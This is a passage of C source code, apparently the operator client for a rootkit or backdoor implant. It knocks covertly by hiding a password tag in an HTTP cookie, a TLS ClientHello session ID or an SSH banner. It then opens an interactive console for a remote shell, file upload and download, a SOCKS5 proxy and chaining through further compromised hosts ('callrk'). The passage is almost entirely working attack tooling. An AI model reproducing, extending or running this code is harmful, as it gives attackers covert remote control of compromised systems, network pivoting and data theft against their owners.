        }

        if (FD_ISSET(sock, &writefds))
        {
            goutbuf_write_sock(host);
        }
    }
	
	stop_proxy(host->sock);

    return 0;

}

int sock_listen(int port)
{
    int sockfd;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        printf(" - socket failed \r\n");

        return -1;
    }

    struct sockaddr_in loc_addr;

    memset(&loc_addr, 0, sizeof(struct sockaddr_in));

    loc_addr.sin_port = htons(port);
    loc_addr.sin_family = AF_INET;
    loc_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sockfd, (struct sockaddr *)&loc_addr, sizeof(struct sockaddr)) < 0)
    {
        printf(" - bind failed \r\n");

        close(sockfd);

        return -2;
    }

    if (listen(sockfd, 10) < 0)
    {
        printf(" - listen failed \r\n");

        close(sockfd);

        return -3;
    }
	
    return sockfd;
}

int fwd_listen(char *port, char *rhost)
{
    char _rhost[512] = {0};

    int _lport = atoi(port);
	
    int sock = sock_listen(_lport);
    if (sock <= 0)
    {
        return -1;
    }
    printf(" + listen port is:%d \r\n", _lport);
	
    _non_blocking(sock);

    add_proxy_client(sock, SOCK_STATE_LISTENER, NULL, 0);

    return 1;
}

int start_proxy(int sockfd, char *lport, char *rhost)
{
    int len, nRet;

    if (fwd_listen(lport, rhost) != 1)
    {
        return -1;
    }

    // 1. CMD_SOCKS5
    nRet = sock_send(sockfd, CMD_SOCKS5, NULL, 0);
    if (nRet < 0)
    {
        printf(" send error! \n");

		close_proxy_all_client();

        return -1;
		// return SK_ERR_send;
    }

    int rsize = 0;
	char buffer[4000] = {0};
	int cmd_type = 0;
	rsize = sock_read(sockfd, &cmd_type, buffer, 4000);
    if (rsize < 0)
    {
        printf(" read error! \n");

		close_proxy_all_client();

        return -1;
		return SK_ERR_recv;
    }

    // 2. recv CMD_SOCKS5_OK
    if(cmd_type != CMD_SOCKS5_OK)
    {
		close_proxy_all_client();
		
        return -2;
    }

	proxy_run = 1;
	
	HOST _host;
	_host.sock = sockfd;

    // 3. background run
    pthread_t tid = 0;
    int ret = pthread_create(&tid, NULL, proxy_loop, &_host);
    if(ret != 0)
        printf("pthread_create failed \n");

    return 0;
}

char tunnels[15][22] = {0};
unsigned int tunnel_x = 0;
void host_display(void)
{
    int i = 0;

    printf(" \n");
    while (tunnels[i][0] != '\0')
    {
        printf(" ->%d: %s\n", i + 1, *(tunnels + i));
        i++;
    }
}

int copyto(unsigned int _x, char *arg)
{
	unsigned int src_len = strlen(arg);
	
	int i;
	for(i = 0; i < src_len; i++) {
		tunnels[_x][i] = *(arg + i);
	}
}

void add_host(char arg[])
{
	if(strlen(arg) > 21)
		return;
	
    strcpy(tunnels[tunnel_x], arg);
	//copyto(tunnel_x , arg);
	
	//printf(" test %d: %s   %s \n", tunnel_x, tunnels[tunnel_x], arg);
	
    tunnel_x += 1;
}

void del_host_last()
{
	if(tunnel_x != 0) {
		debug("tunnel_cnt %d - %s\n", tunnel_x, tunnels[tunnel_x -1]);
		memset(&tunnels[tunnel_x], 0, strlen(tunnels[tunnel_x]));
	
		tunnel_x -= 1;
	}
}

int call_rk(mysocks *msock, int32_t sockfd, char *host, char *password, uint8_t type)
{
    char *sep;
    char buffer[BUFSIZ] = {0};
    char _host[512] = {0};
    char _password[64] = {0};
	char tmp[640] = {0};
	int ret;

    if (host == NULL || strlen(host) > 21)
    {
        return 0;
    }
	
    if(password == NULL || strlen(password) > 64) {
        return 0;
	}

    memcpy(_host, host, strlen(host));
    //rtrim(_host);


    memcpy(_password, password, strlen(password));
    //rtrim(_password);

    sep = strchr(_host, ':');
    if (sep == NULL) {
        printf(" ip:port error! \n");
		
        return 0;
    }

    // ip:port+pass+type
    snprintf(tmp, sizeof(tmp) - 1, "%s+%s+%d", _host, _password, type);

    printf(" login - %s \n\n", _host);

    //  1. CMD_CONNECT
	if (sock_send(sockfd, CMD_CONNECT, tmp, strlen(tmp)) < 0)
    {
        return SK_ERR_send;
    }
	
    memset(buffer, 0, sizeof(buffer));
	int cmd_type = 0;

    if (sock_read(sockfd, &cmd_type, buffer, 3000) < 0)
    {
		// xxx
		// printf("recv timeout! \n");
        return SK_ERR_recv;
    }

    // 2. CMD_CONNECT_OK
    if (cmd_type != CMD_CONNECT_OK)
    {
        return -1;
    }
	
    // 3.
    add_host(host);
	
	return 1;
}

uint8_t check_type(char *str_type)
{
	uint8_t type = 0;
	
	if(str_type == NULL || str_type[0] == '\0')
		return 0;
	
    if(strcmp( "http", str_type ) == 0 )
    {
		type = 0;
    }
		
    if(strcmp( "https", str_type ) == 0 )
    {
		type = 1;
    }

    if(strcmp( "ssh", str_type ) == 0 )
    {
		type = 2;
    }
	
	return type;
}

int exit_rk(char *host, int sockfd)
{
    char buffer[BUFSIZ] = {0};

	// 1.
	if (sock_send(sockfd, CMD_DISCONNECT, NULL, 0) < 0)
    {
        return SK_ERR_send;
    }
	
    memset(buffer, 0, sizeof(buffer));
	int cmd_type = 0;

    if (sock_read(sockfd, &cmd_type, buffer, 3000) < 0)
    {
        return SK_ERR_recv;
    }

    // 2. 
    if (cmd_type != CMD_DISCONNECT_OK)
    {
        return -1;
    }

    del_host_last();

    return 1;
}


void command_switch(mysocks *_sock, int sockfd, char *command)
{
    char *output, copy[1024], *part;
    char *local_path;
    char *remote_path;

    if (strcmp(command, "?") == 0)
    {
        help("");
    }

    strcpy(copy, command);
    part = strtok(copy, " ");

    if (part != NULL)
    {
        if (strcmp(command, "shell") == 0)
        {
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
            start_shell(_sock, sockfd, "");
			
			return;
        }

        if (strcmp(command, "exitrk") == 0)
        {
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
            exit_rk("", sockfd);
        }
		
        if (strcmp(part, "callrk") == 0) {
            char *host = NULL;
            char *password = NULL;
			char *hello_type = NULL;
			uint8_t type = 0;
			
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
            host = strtok(NULL, " ");
            password = strtok(NULL, " ");
			hello_type = strtok(NULL, " ");
			
			// http [0]/ https [1]/ ssh [2]
			type = check_type(hello_type);

            call_rk(_sock, sockfd, host, password, type);
        }
        else if (strcmp(part, "upload") == 0)
        {
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
            local_path = strtok(NULL, " ");
            remote_path = strtok(NULL, " ");
			
            upload_file(_sock, sockfd, local_path, remote_path);
			
			return;
        }
        else if (strcmp(part, "download") == 0)
        {
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
			
            remote_path = strtok(NULL, " ");
            local_path = strtok(NULL, " ");
			
            download_file(_sock, sockfd, local_path, remote_path);
			
			return;
        }
        else if (strcmp(part, "socks5") == 0)
        {
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
            char *lport;
            lport = strtok(NULL, " ");
            if (lport == NULL)
                return ;
			
            start_proxy(sockfd, lport, NULL);
			
			return;
        }
        else if (strcmp(command, "stopsk5") == 0)
        {
            if(stop_proxy(sockfd) == 1)
            {
				
            }else{
				printf(" -> stop error! \n");
            }

        }		
        else if (strcmp(command, "exit") == 0)
        {
			if(proxy_run != 0)
			{
				printf(" - proxy running \r\n");

				return;
			}
			
			if(pty_runing == 1)
            {
				close(sockfd);
				
				exit(0);
			}
			
			unsigned int max = tunnel_x;
			int i;
			for (i = 0; i <= max; i++)
			{
				printf(" -> exit :%d \r\n", tunnel_x);
				
				if(tunnel_x == 0)
					break;
				
				exit_rk("", sockfd);

				usleep(2000);
			}
			
			exit(0);
        }

    }
}

void _mSleep(int second)
{
    static double starttime, stoptime;
    double yet;

    starttime = (double)time(NULL);

    stoptime = starttime + second;

    while (starttime < stoptime)
    {
        starttime = (double)time(NULL);
    }

    return;
}


int ssh_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt)
{
	int ret = 0;
    int sock_fd;
    char buffer[1024+1];
	
	sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }

	ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    // SSH-2.0-SecureCRT_6.2.0 (build 195) SecureCRT\r\n
    // "SSH-2.0-OpenSSH_7.4\r\n"
    memset(buffer, 0, sizeof(buffer));
    snprintf(buffer, sizeof(buffer) - 1, "SSH-2.0-OpenSSH_7.4 %s\r\n", tag_txt);
	
    int bf_size = strlen(buffer);
	
    ret = _sock->send(sock_fd, buffer, bf_size);
    if (ret < 0)
    {
        return SK_ERR_send;
    }
	
    close(sock_fd);
	
	
	return 1;
}

int http_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt)
{
    int ret;
    char req_buf[4000];
	int w_count = 0;
	int sock_fd;

	sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }
	
	ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));
	

    memset(req_buf, 0, sizeof(req_buf));

    char *host_addr = inet_ntoa(dest_addr->sin_addr);

	w_count = snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "GET /index.html HTTP/1.1\r\n");
	
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Host: %s\r\n", host_addr);
	
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36\r\n");
	// xx
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n");

	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Accept-Encoding: gzip, deflate\r\n");
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Accept-Language: en-US,en;q=0.5\r\n");
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Connection: keep-alive\r\n");

	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Cookie: session=%s\r\n", tag_txt);

    strcat(req_buf, "\r\n");
	
    int bf_size = strlen(req_buf);
	
    ret = _sock->send(sock_fd, req_buf, bf_size);
    if (ret < 0)
    {
        return SK_ERR_send;
    }

    close(sock_fd);
	
	return 1;
}

#define ASCII_START 32
#define ASCII_END 126
char* get_rand_str(int size) {
    int i;
	
    char *res = malloc(size + 1);
	
    for(i = 0; i < size; i++) {
        res[i] = (char) (rand()%(ASCII_END-ASCII_START))+ASCII_START;
    }
    res[i] = '\0';
	
    return res;
}

#define SSL3_VERSION                    0x0300
#define TLS1_VERSION                    0x0301
#define TLS1_1_VERSION                  0x0302
#define TLS1_2_VERSION                  0x0303
#define TLS1_3_VERSION                  0x0304
typedef struct _SSL_record 
{
    uint8_t type;
    uint8_t major;
    uint8_t minor;
    uint16_t length;
} __attribute__ ((packed)) SSL_record_t;

typedef struct _SSL_handshake 
{
    uint8_t type;    
    uint8_t length[3];
} __attribute__ ((packed)) SSL_handshake_t;

typedef struct _SSL_handshake_hello
{
    uint8_t type;
    uint8_t length[3];
	
    uint8_t major;
    uint8_t minor;

    uint32_t gmt_unix_time;
    uint8_t random_bytes[28];
	
    uint8_t session_id_length;
    uint8_t session_id[32];

    uint16_t cipher_suites_length;
    uint16_t ciphersuites[5];
	
    uint8_t comp_methods_length;
    uint8_t comp_methods[0];
} __attribute__ ((packed)) SSL_handshake_hello_t;

/*
	//uint32_t rand = htonl(time_now);
	for (int i = 1; i < 8; i++) {
		rand = rand + (time_now ^ (uint32_t)((~(i + 0) << 24) | (~(i + 1) << 16) | (~(i + 2) << 8) | (~(i + 3) << 0)));
		bs_append_uint32_t(client_hello, rand);
	}
*/
int pack_CHello(char *buf, const char *tag_txt)
{
	int handshake_len = 0;
	
    SSL_handshake_hello_t handshake_hello;
	
	handshake_len = sizeof(SSL_handshake_hello_t) - sizeof(SSL_handshake_t);
	
	handshake_hello.type = 1;		// CLIENT HELLO 1
	handshake_hello.length[0] = (uint8_t)((handshake_len >> 16) & 0xff);
	handshake_hello.length[1] = (uint8_t)((handshake_len >> 8) & 0xff);
	handshake_hello.length[2] = (uint8_t)(handshake_len & 0xff);
	
	// #define TLS1_2_VERSION		0x0303
	handshake_hello.major = 0x03;
	handshake_hello.minor = 0x03;
	
	time_t time_now = time(NULL);
	char *rand_str28 = get_rand_str(28);
	handshake_hello.gmt_unix_time = htonl(time_now);
	memcpy(&handshake_hello.random_bytes , rand_str28, 28);

    handshake_hello.session_id_length = sizeof(handshake_hello.session_id);
	
	// max 32
	int tag_len = strlen(tag_txt);
	char *rand_str32 = get_rand_str(32);
	memcpy(handshake_hello.session_id, rand_str32, 32 - tag_len);
	memcpy(handshake_hello.session_id + 32 - tag_len, tag_txt , tag_len);

	
	handshake_hello.cipher_suites_length = sizeof(handshake_hello.ciphersuites);
	handshake_hello.ciphersuites[0] = 0x1301;
	handshake_hello.ciphersuites[1] = 0xc030;
	handshake_hello.ciphersuites[2] = 0xc013;
	handshake_hello.ciphersuites[3] = 0x009c;
	handshake_hello.ciphersuites[4] = 0x0035;
	
    handshake_hello.comp_methods_length = sizeof(&handshake_hello.comp_methods);
	handshake_hello.comp_methods[0] = 0x00;

	
	SSL_record_t SSL_record;
	SSL_record.type = 22;			// ssl HANDSHAKE	22
	SSL_record.major = 0x03;		// #define TLS1_VERSION		0x0301
	SSL_record.minor = 0x01;
	SSL_record.length = sizeof(handshake_hello);
	
	int record_len = sizeof(SSL_record);
	
	memcpy(buf, &SSL_record, record_len);
	
	memcpy(buf + record_len, &handshake_hello, sizeof(handshake_hello));
	
	return record_len + sizeof(handshake_hello);
}

int https_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt)
{
    int ret;
	int w_count = 0;
	int sock_fd;
	char ssl_buf[512];

	sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }
	
	ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    memset(ssl_buf, 0, sizeof(ssl_buf));
	
	// TLSv1.2 Client Hello
	int bf_len = pack_CHello(ssl_buf, tag_txt);
	
    ret = _sock->send(sock_fd, ssl_buf, bf_len);
    if (ret < 0)
    {
        return SK_ERR_send;
    }

    close(sock_fd);
	
	return 1;
}

int start_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt, int type)
{
	int ret = 0;
    // http [0]/ https [1]/ ssh [2]
    if(type == 0)
	{
		ret = http_hello(_sock, dest_addr, tag_txt);
	}

    if(type == 1)
	{
		ret = https_hello(_sock, dest_addr, tag_txt);
	}
	
    if(type == 2)
	{
		ret = ssh_hello(_sock, dest_addr, tag_txt);
	}
	
	if(ret < 0)
	{
		return ret;
	}

    _mSleep(1);

    return 0;
}


int start_login(mysocks *_sock, struct sockaddr_in *dest_addr)
{
    char buffer[4000] = {0};
	int buf_len = 0;
    int sock_fd;
	int ret;

	sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }

	ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));


    //  1. CMD_LOGIN
	if (sock_send(sock_fd, CMD_LOGIN, NULL, 0) < 0)
    {
        return SK_ERR_send;
    }
	
    memset(buffer, 0, sizeof(buffer));
	int cmd_type = 0;

    if (sock_read(sock_fd, &cmd_type, buffer, 4000) < 0)
    {
        return SK_ERR_recv;
    }

    // 2. CMD_LOGIN_YES
    if (cmd_type != CMD_LOGIN_YES)
    {
        return -1;
    }

    return sock_fd;
}


int get_input(mysocks *_sock, int sockfd)
{
    char *command = NULL;
    char input[MAXLINE] = {0};
    char fmtcmd[256] = {0};

    sprintf(fmtcmd, " #(%d)%s> ", tunnel_x, tunnels[tunnel_x-1]);

    command = readline(fmtcmd);
    if (strlen(command) != 0) {
        strcpy(input, command);

        add_history(command);
        free(command);

        command_switch(_sock, sockfd, input);
		
        return 0;
    }
    else
    {
        free(command);
        return 1;
    }
}

/*
void ctrl_chandler(int sig)
{
    char input[MAXLINE];
    printf("\n Exit from the shell? [yes/no]: ");
    scanf("%31s", input);

    if ((strcmp(input, "y") == 0) || (strcmp(input, "Y") == 0) ||
        (strcmp(input, "yes") == 0))
        //	|| (strcmp(input, "YES") == 0))
        exit(0);
    //else
    //longjmp(jump_buffer, 1);
}
*/


int main(int argc, char *argv[])
{
    char buffer[MAXLINE] = {0};
    struct hostent *host_addr;
    struct sockaddr_in dest_addr;
    int _iport;
    char *host;
    char *port;
    char *password;
    int server_fd;
	int hello_ok;
	int type = 0;

	//signal(SIGINT, ctrl_chandler);
    signal(SIGPIPE, SIG_IGN);


    if (argc != 4 && argc != 5)
    {
        printf("\n Usage: %s ip port password [http/https/ssh] \n", argv[0]);

        return 1;
    }

    host = argv[1];
    port = argv[2];
    password = argv[3];
	
	if (argc == 5)
	{
        // http [0]/ https [1]/ ssh [2]
        if(strcmp( "http", argv[4] ) == 0 )
        {
			type = 0;
        }
		
        if(strcmp( "https", argv[4] ) == 0 )
        {
			type = 1;
        }

        if(strcmp( "ssh", argv[4] ) == 0 )
        {
			type = 2;
        }
	}
	
    g_dst_ip = host;
    g_dst_port = atoi(port);
	
	srand((unsigned)time(NULL));
	
    mysocks _mysocks =
    {
        sk_init,
        sk_socket,
        sk_bind,
        sk_listen,
        sk_connect,
        sk_accept,
        sk_send_all,
        sk_recv_all
    };


    _mysocks.init(&dest_addr, host, atoi(port));

#ifndef DEBUG
    hello_ok = start_hello(&_mysocks, &dest_addr, password, type);
    if (hello_ok < 0)
    {
        return 0;
    }
#endif


    server_fd = start_login(&_mysocks, &dest_addr);
    if (server_fd < 0)
    {
        exit(0);
    }
	

    while (1)
    {
        get_input(&_mysocks, server_fd);
    }

    return 0;
}
